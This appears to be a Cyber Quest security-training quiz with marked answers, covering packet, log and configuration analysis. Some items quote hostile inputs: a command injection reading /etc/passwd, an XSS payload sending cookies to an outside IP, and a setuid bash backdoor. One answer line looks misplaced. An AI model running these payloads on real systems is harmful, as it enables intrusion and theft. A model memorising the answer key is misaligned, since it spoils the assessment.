
**Before you begin, please download and install [Wireshark](http://www.wireshark.org/download.html "Download Wireshark") (1.4.6 or later), and then download the following ZIP file (containing 10 files) for analysis:**  
[**Cyber Quest: Winter 2025 Resources**](http://uscc.cyberquests.org/assets/cyberquest_winter2025_resources.zip)

### Question
One of your web servers was attacked with command injection using the string 254.254.254.254; cat /etc/passwd and then 254.254.254.254 && /etc/passwd. Filtering the ; and & characters will prevent all forms of command injection: true or false?

Select one:
True
```
False
```

### Question
A technician is troubleshooting the network and sends you an unusual packet to examine. He copied the packet from his terminal and provided you the file packetcopy.txt in your resources folder. Identify which of the following statements is correct. Mark all that apply.

Select one or more:

There is no IP header present
```
The packet contains ICMP
```
The packet contains UDP
```
The sending host is 10.10.17.45
```

### Question
You are reviewing the configuration of a system that has just been built by a technician. You note that by default, Postfix's **SMTPD_LISTEN_REMOTE** option is set to yes. What is the impact of this?

Select one:

This option is irrelevant
Postfix is listening and may be able to send mail locally to the network
```
Postfix is listening and is likely reachable from the network
```
Postfix can be remotely administered from other systems

### Question
What version of SMB did Microsoft introduce with Server 2012? Hint: It introduced share level encryption.

Select one:

SMBv4
SMBv2
```
SMBv3
```
SMBv2.1

### Question
Which of the following represents the weakest security setting on a Linux file system?

Select one:

```
chmod 777
```
chmod 000
chmod 755
chmod 444

### Question
Which of the following in particular are a security concern on a network using VLANs? Mark all that apply.

Select one or more:

Directed ICMP traffic
```
Attacks against exposed daemons like DHCP
Double tagging
```
IPv6 traffic

### Question
On your web server, you locate a PHP script which has been accessed a great deal frequently. Analyze call.php from the resources folder. From this code, is this script likely good or bad?

Select one:

It is not a security risk
```
It is a security risk
```

### Question
A SlowLoris attack is launched against your Apache and IIS web servers. Assuming they are not patched against the attack, which of the following statements is likely true?  Mark all that apply.

Select one or more:

The IIS server will be impacted
Tuning the IP header connection queue or SYN cookies will help resist the DoS
Bandwidth will be intensely used during the DoS
The Apache server will be impacted

### Question
You are conducting a routine review of the SSH servers in your environment. In the resources folder you will find a file named 'ssh.pcap'. Analyze this file and identify which of the following is most likely occurring.

Select one:

An SSH brute force attack
Standard SSH traffic
An SSH protocol downgrade attack
Standard SSH traffic with a few non fatal networking errors

### Question
Review the web log apache2.log from the resources folder.  Which of the statements are likely true? Mark all that apply.

Select one or more:

```
The web server is being scanned for vulnerabilities
The traffic is from the Internet
The user agent is likely spoofed
```
The traffic is from the LAN

### Question
An attacker runs an nmap scan on your network with the following syntax:

`nmap -D 10.10.17.2,10.10.17.92 10.10.17.45`

Which of the following statements is correct?

Select one:

The command will use 10.10.17.2, 10.10.17.92 and 10.10.17.45 as decoys
```
The command will scan 10.10.17.45 and attempt to use 10.10.17.2 and 10.10.17.92 as decoys
```
The command will scan 10.10.17.45, 10.10.17.92 and 10.10.17.2
The command will scan 10.10.17.2 and use 10.10.17.92 and 10.10.17.45 as decoys

### Question
Your IPS vendor's security system is updating from the Internet and downloads a configuration file called up2date.config. This file is included in the resources directory. Identify if there is a security problem with this file and if so, enter the password they reveal (if not, leave this question blank).

```
Answer: awesomesauce1996
```

### Question
On a Windows network, which of the following is the least secure mechanism of exchanging credentials?

Select one:

NTLM
NTLM2
Kerberos
```
LanMan
```

### Question
One of your small branch offices has been set up using the latest wireless router. As it is a smaller office you can't use 802.1x authentication, and so it has been set up with WPA2+AES (PSK) with WPS for quick configuration. Which of the following statements is likely true?  Mark all that apply.

Select one or more:

The network will be safe, provided a secure passphrase is used
The network will be more vulnerable to deauthentication packets than an 802.1x network
The network is probably vulnerable to a reaver attack
If one client's passphrase is stolen, all traffic can be decrypted

### Question
Analyze the bind.log file and identify which of the following statements is likely true. Mark all that apply.

Select one or more:

A dangerous reverse version request has occurred
A potentially dangerous zone transfer has occurred
The DNS server is accessible from the Internet
The DNS server is accessible from the local LAN

### Question
A script on your Intranet page redirects to a website. Which domain is redirected to by the script? Do not include http:// a trailing / or any directory or variable components, just the domain, e.g. www.sans.org. A copy of the script is provided in scriptsample.html in the resources folder.

Answer:

### Question
You are reviewing the history on one of the Linux boxes in your environment. A co-worker's administrative account has the following series of actions. What has he done?

`cd /bin; ln -s /bin/bash rbash; vi /etc/passwd`

Select one:

Created a link to bash for performance and assigned it to users
Created a backup of the bash shell and changed a user password
Created a backdoor on the system
```
Created a restricted shell environment
```

### Question
You have been given an output of wireless traffic in a part of the office. Analyze the wifi.pcap file and identify what is most likely occurring.

Select one:

A unicode SSID conversion issue
Filtered wireless traffic of standard wireless
Corrupted wireless traffic
Fuzzing wireless access point names

### Question
A user reports networking issues on their part of the office. On analysing their devices' network information, you find connectivity issues to other local devices. Analyze arp.txt from the resources folder. Which of the following is likely the case?

Select one:

The machine has been arp poisoned, most likely by 3c:3:2c:78:b6:e6
The machine has been arp poisoned, most likely by ff:ff:ff:ff:ff:ff
The machine has a normal networking configuration
The machine has a corrupt network stack, a reboot should rectify and prevent the issue

### Question
In one of your IDS logs, you identify a rule that has been hit for the traffic `http://intranet/session.php?postvalue=<script>document.location="http://10.10.17.91/documents.php?c="+document.cookie;</script>`. The traffic was allowed and returned a 200 code. Which of the following statements are likely true?  Mark all that apply.

Select one or more:

The intranet server may be vulnerable to XSS
The intranet server uses default session management
The intranet server is just connecting to another system to authenticate
The IP 10.10.17.91 is an attacker or a compromised system

### Question
In all instances, if an attacker extracts password hashes from a system, they need to break them to be able to access other systems. True or false?

Select one:

True
```
False
```

### Question
You notice a series of commands have been executed which create an undesirable security hole on your Linux server. The commands are '`cp /bin/bash /bin/.bash; chmod 4755 /bin/.bash`'. Which of the following would have allowed you to find such files with insecure permissions on the system had you not seen this history entry?

Select one:

`find / -size -4755`
`locate .* -perm -4000`
`find / -perm -4000`
`find / -iname "."`

### Question
As part of an infrastructure overhaul project, the network security team have decided to implement a new VPN service. IPSec has been selected for resilience and compatibility. IKE aggressive mode will be used to further enhance security. This is a good implementation, true or false?

Select one:

True
```
False
```

### Question
When analyzing one of your web applications, you identify a session value and want to analyze it to identify sensitive data. The session value for your user is `SES:53924537412317063\N7366400\N01031988\N`. Identify the sensitive string of data contained in the session.

Answer: Question 24

### Question
Analyze the webdl.pcap file in the resources folder. Identify the keyword contained within the transaction. Only enter the code contained within the '' without the quotes themselves.

Answer:

